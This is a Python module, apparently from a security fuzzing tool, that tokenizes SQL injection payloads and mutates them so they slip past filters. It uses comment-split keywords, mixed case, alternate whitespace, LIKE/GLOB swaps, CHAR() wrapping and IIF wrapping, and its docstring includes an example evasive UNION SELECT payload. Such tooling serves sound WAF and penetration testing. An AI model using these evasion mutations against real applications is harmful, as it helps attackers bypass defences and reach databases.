"""SQL-AST-aware mutation — token-level payload transformation.

Unlike string-level mutators that apply regex substitutions blindly, this
module tokenizes SQL injection payloads into classified tokens (keyword,
operator, number, comment, …) and mutates at the token level.  This lets
strategies compose: ``comment_split`` on the keyword *and* ``operator_equiv``
on the comparison *and* ``whitespace_swap`` between them — producing payloads
like ``'/**/uNiOn/**/sElEcT/**/1 LIKE 1%0a;%00`` that no single string-level
mutator would generate.

The tokenizer handles injection *payloads*, not full SQL statements.
"""
from __future__ import annotations

import itertools
import re
from copy import deepcopy
from dataclasses import dataclass

from .base import REGISTRY

_SQL = {"SQL Injection", "NoSQL Injection"}

# ---- tokens ---------------------------------------------------------------

_KEYWORDS = frozenset({
    "UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "ORDER", "BY",
    "GROUP", "HAVING", "INSERT", "UPDATE", "DELETE", "DROP", "TABLE",
    "LIMIT", "NULL", "NOT", "EXISTS", "JOIN", "LIKE", "BETWEEN", "IN",
    "CASE", "WHEN", "THEN", "ELSE", "END", "AS", "SET", "INTO",
    "VALUES", "EXEC", "EXECUTE", "DECLARE", "CAST", "CONVERT",
    # SQLite-specific
    "GLOB", "COLLATE", "MATCH", "ISNULL", "NOTNULL", "ESCAPE",
    # Boolean helpers
    "IS", "TRUE", "FALSE",
})

_MULTI_WORD_KW = [
    ("ORDER", "BY"), ("GROUP", "BY"), ("IS", "NULL"), ("IS", "NOT", "NULL"),
    ("NOT", "IN"), ("NOT", "LIKE"), ("NOT", "EXISTS"), ("UNION", "ALL"),
    ("INSERT", "INTO"), ("SIMILAR", "TO"), ("SOUNDS", "LIKE"),
]


@dataclass
class SQLToken:
    value: str
    kind: str  # QUOTE KEYWORD OPERATOR NUMBER STRING COMMENT WHITESPACE
               # FUNCTION OPEN_PAREN CLOSE_PAREN IDENTIFIER COMMA UNKNOWN

    def __repr__(self):
        return f"{self.kind}({self.value!r})"


# ---- tokenizer ------------------------------------------------------------

_HEX_NUM = re.compile(r"0[xX][0-9a-fA-F]+")
_FLOAT_NUM = re.compile(r"\d+\.\d*([eE][+-]?\d+)?|\.\d+([eE][+-]?\d+)?|\d+[eE][+-]?\d+")
_INT_NUM = re.compile(r"\d+")
_IDENT = re.compile(r"[A-Za-z_@#][A-Za-z0-9_@#.]*")
_WS = re.compile(r"[\s]+")

_TWO_CHAR_OPS = frozenset({"<=", ">=", "<>", "!=", "||", ">>", "<<", ":=", "!~"})
_ONE_CHAR_OPS = frozenset({"=", "<", ">", "+", "-", "*", "/", "%", "&", "|", "^", "~"})


def tokenize(payload: str) -> list[SQLToken]:
    tokens: list[SQLToken] = []
    i = 0
    n = len(payload)

    while i < n:
        c = payload[i]

        # whitespace
        m = _WS.match(payload, i)
        if m:
            tokens.append(SQLToken(m.group(), "WHITESPACE"))
            i = m.end()
            continue

        # block comment /* ... */
        if payload[i:i+2] == "/*":
            end = payload.find("*/", i + 2)
            if end == -1:
                tokens.append(SQLToken(payload[i:], "COMMENT"))
                break
            tokens.append(SQLToken(payload[i:end+2], "COMMENT"))
            i = end + 2
            continue

        # line comment -- or #
        if payload[i:i+2] == "--" or c == "#":
            tokens.append(SQLToken(payload[i:], "COMMENT"))
            break

        # line comment ;%00 (null-terminated)
        if c == ";" and i + 3 <= n and payload[i+1:i+3] == "%0" and (i + 4 <= n and payload[i+3:i+4] in ("0", "O")):
            tokens.append(SQLToken(payload[i:], "COMMENT"))
            break

        # quoted string 'abc' or "abc"
        if c in ("'", '"'):
            # check if this is just an injection quote (single char boundary)
            j = i + 1
            if j >= n or payload[j:j+1] in (" ", "\t", "\n", "\r", "", "-"):
                tokens.append(SQLToken(c, "QUOTE"))
                i = j
                continue
            # scan for matching close quote
            close = payload.find(c, j)
            if close == -1:
                tokens.append(SQLToken(c, "QUOTE"))
                i = j
                continue
            tokens.append(SQLToken(payload[i:close+1], "STRING"))
            i = close + 1
            continue

        # parentheses
        if c == "(":
            tokens.append(SQLToken(c, "OPEN_PAREN"))
            i += 1
            continue
        if c == ")":
            tokens.append(SQLToken(c, "CLOSE_PAREN"))
            i += 1
            continue

        # comma
        if c == ",":
            tokens.append(SQLToken(c, "COMMA"))
            i += 1
            continue

        # hex number 0x...
        m = _HEX_NUM.match(payload, i)
        if m:
            tokens.append(SQLToken(m.group(), "NUMBER"))
            i = m.end()
            continue

        # float / scientific
        m = _FLOAT_NUM.match(payload, i)
        if m:
            tokens.append(SQLToken(m.group(), "NUMBER"))
            i = m.end()
            continue

        # integer
        m = _INT_NUM.match(payload, i)
        if m:
            tokens.append(SQLToken(m.group(), "NUMBER"))
            i = m.end()
            continue

        # two-char operators
        if i + 1 < n and payload[i:i+2] in _TWO_CHAR_OPS:
            tokens.append(SQLToken(payload[i:i+2], "OPERATOR"))
            i += 2
            continue

        # one-char operators
        if c in _ONE_CHAR_OPS:
            tokens.append(SQLToken(c, "OPERATOR"))
            i += 1
            continue

        # identifier or keyword
        m = _IDENT.match(payload, i)
        if m:
            word = m.group()
            # look-ahead: if followed by '(' it's a function
            rest = payload[m.end():]
            rest_stripped = rest.lstrip()
            if rest_stripped.startswith("("):
                tokens.append(SQLToken(word, "FUNCTION"))
            elif word.upper() in _KEYWORDS:
                tokens.append(SQLToken(word, "KEYWORD"))
            else:
                tokens.append(SQLToken(word, "IDENTIFIER"))
            i = m.end()
            continue

        # percent-encoded byte %XX — treat as part of a larger token or unknown
        if c == "%" and i + 2 < n and payload[i+1:i+3].isalnum():
            tokens.append(SQLToken(payload[i:i+3], "UNKNOWN"))
            i += 3
            continue

        tokens.append(SQLToken(c, "UNKNOWN"))
        i += 1

    # post-pass: merge multi-word keywords (ORDER BY, etc.)
    tokens = _merge_multi_word_keywords(tokens)
    return tokens


def _merge_multi_word_keywords(tokens: list[SQLToken]) -> list[SQLToken]:
    """Merge sequences like [KW(ORDER), WS, KW(BY)] into [KW(ORDER BY)]."""
    result: list[SQLToken] = []
    i = 0
    while i < len(tokens):
        merged = False
        for mw in sorted(_MULTI_WORD_KW, key=len, reverse=True):
            kw_tokens = []
            pos = i
            matched = 0
            while matched < len(mw) and pos < len(tokens):
                if tokens[pos].kind == "WHITESPACE":
                    kw_tokens.append(tokens[pos])
                    pos += 1
                    continue
                if tokens[pos].kind == "KEYWORD" and tokens[pos].value.upper() == mw[matched]:
                    kw_tokens.append(tokens[pos])
                    matched += 1
                    pos += 1
                else:
                    break
            if matched == len(mw):
                combined = " ".join(mw)
                result.append(SQLToken(combined, "KEYWORD"))
                i = pos
                merged = True
                break
        if not merged:
            result.append(tokens[i])
            i += 1
    return result


def reconstruct(tokens: list[SQLToken]) -> str:
    return "".join(t.value for t in tokens)


# ---- mutation strategies ---------------------------------------------------

def _apply_to_kind(tokens: list[SQLToken], kind: str, fn) -> list[SQLToken]:
    out = []
    for t in tokens:
        if t.kind == kind:
            out.append(SQLToken(fn(t.value), t.kind))
        else:
            out.append(SQLToken(t.value, t.kind))
    return out


# --- a) sqlite_swap

_SQLITE_SWAPS = {
    "LIKE": "GLOB",
    "IS NULL": "ISNULL",
    "IS NOT NULL": "NOTNULL",
}

def strategy_sqlite_swap(tokens: list[SQLToken]) -> list[SQLToken]:
    out = []
    for t in tokens:
        if t.kind == "KEYWORD" and t.value.upper() in _SQLITE_SWAPS:
            out.append(SQLToken(_SQLITE_SWAPS[t.value.upper()], "KEYWORD"))
        else:
            out.append(SQLToken(t.value, t.kind))
    return out


# --- b) comment_split

def _split_with_comment(word: str) -> str:
    if len(word) < 2:
        return word
    mid = len(word) // 2
    return word[:mid] + "/**/" + word[mid:]

def strategy_comment_split(tokens: list[SQLToken]) -> list[SQLToken]:
    return _apply_to_kind(tokens, "KEYWORD", _split_with_comment)


# --- c) case_mix

def _alternating_case(word: str) -> str:
    return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(word))

def strategy_case_mix(tokens: list[SQLToken]) -> list[SQLToken]:
    return _apply_to_kind(tokens, "KEYWORD", _alternating_case)


# --- d) whitespace_swap

_ALT_WHITESPACE = ["\t", "\n", "\x0b", "\x0c", "\r\n"]

def strategy_whitespace_swap(tokens: list[SQLToken], variant: int = 0) -> list[SQLToken]:
    ws = _ALT_WHITESPACE[variant % len(_ALT_WHITESPACE)]
    return _apply_to_kind(tokens, "WHITESPACE", lambda _: ws)


# --- e) operator_equiv

_OP_EQUIVS = {
    "=": [" LIKE ", " GLOB ", " BETWEEN {L} AND {L}", " IN ({L})"],
}

def strategy_operator_equiv(tokens: list[SQLToken]) -> list[SQLToken]:
    out = []
    i = 0
    while i < len(tokens):
        t = tokens[i]
        if t.kind == "OPERATOR" and t.value == "=" and i >= 1 and i + 1 < len(tokens):
            left = tokens[i - 1] if tokens[i - 1].kind != "WHITESPACE" else (
                tokens[i - 2] if i >= 2 else tokens[i - 1])
            out.append(SQLToken(" LIKE ", "OPERATOR"))
            i += 1
        else:
            out.append(SQLToken(t.value, t.kind))
            i += 1
    return out


# --- f) comment_swap

def strategy_comment_swap(tokens: list[SQLToken]) -> list[SQLToken]:
    out = []
    for t in tokens:
        if t.kind == "COMMENT":
            v = t.value
            if v.startswith("--"):
                out.append(SQLToken("#", "COMMENT"))
            elif v.startswith("#"):
                out.append(SQLToken("-- -", "COMMENT"))
            else:
                out.append(SQLToken(t.value, t.kind))
        else:
            out.append(SQLToken(t.value, t.kind))
    return out


# --- g) function_wrap

def _num_to_char(val: str) -> str:
    try:
        n = int(val)
        if 0 <= n <= 127:
            return f"CHAR({n})"
    except ValueError:
        pass
    return val

def strategy_function_wrap(tokens: list[SQLToken]) -> list[SQLToken]:
    return _apply_to_kind(tokens, "NUMBER", _num_to_char)


# --- h) concat_build

def _string_to_concat(val: str) -> str:
    if len(val) < 4 or val[0] not in ("'", '"'):
        return val
    q = val[0]
    inner = val[1:-1]
    if len(inner) < 2:
        return val
    mid = len(inner) // 2
    return f"{q}{inner[:mid]}{q}||{q}{inner[mid:]}{q}"

def strategy_concat_build(tokens: list[SQLToken]) -> list[SQLToken]:
    return _apply_to_kind(tokens, "STRING", _string_to_concat)


# --- i) iif_wrap

def strategy_iif_wrap(tokens: list[SQLToken]) -> list[SQLToken]:
    out = []
    i = 0
    while i < len(tokens):
        # pattern: NUM OP NUM → IIF(NUM OP NUM, 1, 0)
        if (tokens[i].kind == "NUMBER" and
                i + 2 < len(tokens) and
                tokens[i + 1].kind == "OPERATOR" and tokens[i + 1].value in ("=", "<>", "!=", ">", "<", ">=", "<=", " LIKE ") and
                tokens[i + 2].kind == "NUMBER"):
            cond = f"{tokens[i].value}{tokens[i+1].value}{tokens[i+2].value}"
            out.append(SQLToken(f"IIF({cond},1,0)", "FUNCTION"))
            i += 3
            continue
        out.append(SQLToken(tokens[i].value, tokens[i].kind))
        i += 1
    return out


# --- j) number_obfuscate

_NUM_VARIANTS = {
    "1": ["0x1", "1.0", "1e0", "(2-1)", "~0&1", "CHAR(49)"],
    "0": ["0x0", "0.0", "0e0", "(1-1)"],
    "2": ["0x2", "2.0", "2e0", "(1+1)"],
}

def strategy_number_obfuscate(tokens: list[SQLToken], variant: int = 0) -> list[SQLToken]:
    out = []
    for t in tokens:
        if t.kind == "NUMBER" and t.value in _NUM_VARIANTS:
            alts = _NUM_VARIANTS[t.value]
            out.append(SQLToken(alts[variant % len(alts)], "NUMBER"))
        else:
            out.append(SQLToken(t.value, t.kind))
    return out


# ---- strategy registry & composite ----------------------------------------

STRATEGIES = {
    "sqlite_swap": strategy_sqlite_swap,
    "comment_split": strategy_comment_split,
    "case_mix": strategy_case_mix,
    "whitespace_swap": strategy_whitespace_swap,
    "operator_equiv": strategy_operator_equiv,
    "comment_swap": strategy_comment_swap,
    "function_wrap": strategy_function_wrap,
    "concat_build": strategy_concat_build,
    "iif_wrap": strategy_iif_wrap,
    "number_obfuscate": strategy_number_obfuscate,
}


def apply_strategy(tokens: list[SQLToken], name: str) -> list[SQLToken]:
    fn = STRATEGIES[name]
    return fn(deepcopy(tokens))


def ast_mutate(payload: str, strategies: list[str] | None = None,
               max_combos: int = 15) -> list[str]:
    """Apply AST-aware mutations, returning multiple variants.

    Generates single-strategy variants and pairwise + triple combos.
    """
    strats = strategies or list(STRATEGIES.keys())
    tokens = tokenize(payload)
    seen: set[str] = {payload}
    variants: list[str] = []

    def _add(result_tokens):
        s = reconstruct(result_tokens)
        if s not in seen and s.strip():
            seen.add(s)
            variants.append(s)

    # single strategies
    for name in strats:
        _add(apply_strategy(tokens, name))

    # pairwise combos (most valuable)
    for a, b in itertools.combinations(strats, 2):
        if len(variants) >= max_combos:
            break
        t = apply_strategy(tokens, a)
        t = apply_strategy(t, b)
        _add(t)

    # triple combos — high-impact combinations
    _TRIPLES = [
        ("comment_split", "whitespace_swap", "operator_equiv"),
        ("sqlite_swap", "iif_wrap", "number_obfuscate"),
        ("case_mix", "concat_build", "comment_swap"),
        ("comment_split", "case_mix", "whitespace_swap"),
        ("sqlite_swap", "comment_split", "function_wrap"),
        ("operator_equiv", "number_obfuscate", "whitespace_swap"),
    ]
    for combo in _TRIPLES:
        if len(variants) >= max_combos:
            break
        valid = all(c in STRATEGIES for c in combo)
        if not valid:
            continue
        t = deepcopy(tokens)
        for name in combo:
            t = apply_strategy(t, name)
        _add(t)

    return variants


# ---- single-strategy mutator functions (for registry) ----------------------

def _make_single(strategy_name: str):
    def _fn(payload: str) -> str:
        tokens = tokenize(payload)
        result = apply_strategy(tokens, strategy_name)
        out = reconstruct(result)
        return out if out != payload else payload
    return _fn


def _ast_combined_multi(payload: str) -> list[str]:
    return ast_mutate(payload, max_combos=20)


def _ast_combined_single(payload: str) -> str:
    variants = ast_mutate(payload, max_combos=5)
    return variants[0] if variants else payload


# ---- registration ----------------------------------------------------------

def _register():
    R = REGISTRY

    for name in STRATEGIES:
        R.add(f"ast_{name}", _make_single(name), "obfuscator",
              f"AST token-level: {name}", classes=_SQL)

    R.add("ast_combined", _ast_combined_single, "obfuscator",
          "AST composite: multi-strategy token-level mutation",
          classes=_SQL, multi=True, multi_fn=_ast_combined_multi)


_register()
